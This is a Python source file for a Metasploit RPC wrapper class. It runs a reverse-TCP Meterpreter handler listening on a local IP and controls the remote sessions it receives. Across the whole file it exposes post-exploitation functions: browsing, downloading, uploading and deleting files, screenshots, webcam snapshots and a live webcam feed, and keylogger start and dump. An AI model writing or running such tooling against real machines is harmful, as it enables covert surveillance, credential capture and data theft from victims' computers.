from metasploit.msfrpc import MsfRpcClient
from tools import explorer
from tools import media
from tools import screenshot
from tools import webcam
from tools import information
from tools import keylogger

import os
import time
import socket
import fcntl
import struct
from Shell import Shell

class MsfToolbox:
	"""
    Metasploit RPC listens locally to the port by default (55553)
    msfrpcd -P mypassword -n -f -a 127.0.0.1
	# os.system("msfrpcd -P " + mypassword + " -n -f -a 127.0.0.1")

	Paradigme de delegation pour les differents modules qui correspondent a des fonctionnalites
    """
	def __init__(self, password='mypassword', port=55553):
		self._port = port
		self._password = password
		self.init_client()

		self._ip = '192.168.4.1'
		#self._ip = '172.21.42.1'

		# Remove old medias
		media.remove_medias()

		# Init remote to false
		self.disable_remote()


	def init_client(self):
		self._client = MsfRpcClient(self._password, port=self._port)
		self._console = self._client.consoles.console()


	def exploit_multi_handler(self, lport=4444, payload='windows/x64/meterpreter/reverse_tcp'):
		exploit = self._client.modules.use('exploit', 'multi/handler')
		pl = self._client.modules.use('payload', payload)
		pl['LPORT'] = lport
		pl['LHOST'] = self._ip
		pl['EXITFUNC'] = 'thread'

		exploit.execute(payload=pl)


	def get_ip_address(self, ifname):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		return socket.inet_ntoa(fcntl.ioctl(
		                        s.fileno(),
								0x8915,  # SIOCGIFADDR
								struct.pack('256s', ifname[:15])
								)[20:24])


	def get_sessions(self):
		return self._client.sessions.list


	def session_close(self, session_id):
		shell = self.get_session_shell(session_id)
		shell.write('exit')
		time.sleep(1)
		return


	def session_kill(self, session_id):
		""" Hard kill session """
		self._console.write("sessions -k {}\n".format(session_id))


	def get_session_shell(self, session_id):
		return Shell(self, session_id, self._client.sessions.session(session_id))


	def get_client(self):
	    return self._client


	def get_jobs(self):
	    return self._client.jobs.list


	def kill_job(self, id):
		return self._client.jobs.stop(id)


	def search(self, search_type, pattern):
	    search_set = { "EXPLOIT":  self._client.modules.exploits,
	                   "POST": self._client.modules.post }
	    print filter(lambda x: pattern in x, search_set[search_type])


	def is_connexion_established(self):
	    return not self._client.sessions.list


	# Explorer
	def ls(self, shell):
		return explorer.ls(shell)


	def cd(self, shell, arg):
		return explorer.cd(shell, arg)


	def download(self, shell, name):
		return explorer.download(shell, name)


	def upload(self, shell, file):
		return explorer.upload(shell, file)


	def rm(self, shell, name):
		return explorer.rm(shell, name)


	def rmdir(self, shell, name):
		return explorer.rmdir(shell, name)


	def add_routing_files(self, files):
		return explorer.add_routing_files(files)


	# Screenshot
	def post_take_screenshot(self, session=1, path=None, count=1, delay=0, record=True, view_screenshots=False):
		screenshot_path = media.get_media_path(session, "screenshots")

		# Take screenshot
		screenshot.post_take_screenshot(self._client, session, screenshot_path, count, delay, record, view_screenshots)

		# Wait the end of the function (migration or execution of screenshot)
		while not os.path.exists(screenshot_path):
			time.sleep(0.1)


	def get_screenshots_url(self, session):
		return media.get_medias_url(session, "screenshots")


	# Information
	def get_sysinfo(self, session):
		return information.get_sysinfo(self.get_session_shell(session))


	# Webcam snapshots
	def post_take_snapshot(self, session):
		shell = self.get_session_shell(session)
		snapshot_path = media.get_media_path(session, "snapshots")

		# Take snapshot
		webcam.post_take_snapshot(shell, snapshot_path)


	def get_snapshots_url(self, session):
		return media.get_medias_url(session, "snapshots")


	# Live
	def start_live(self, session):
		media.remove_live_path()


	def stop_live(self, session):
		media.remove_live_path()


	def live_update_frame(self, session):
		shell = self.get_session_shell(session)
		live_path = media.get_live_path()
		webcam.post_take_snapshot(shell, live_path)


	def get_live_url(self):
		return media.get_live_url()


	# Keylogger
	def start_keylogger(self, session):
		shell = self.get_session_shell(session)
		return keylogger.start(shell)


	def stop_keylogger(self, session):
		shell = self.get_session_shell(session)
		return keylogger.stop(shell)


	def dump_keylogger(self, session):
		shell = self.get_session_shell(session)
		return keylogger.dump(shell)


	# Remote
	def enable_remote(self):
		self._remote = True


	def disable_remote(self):
		self._remote = False


	def get_remote_state(self):
		return self._remote
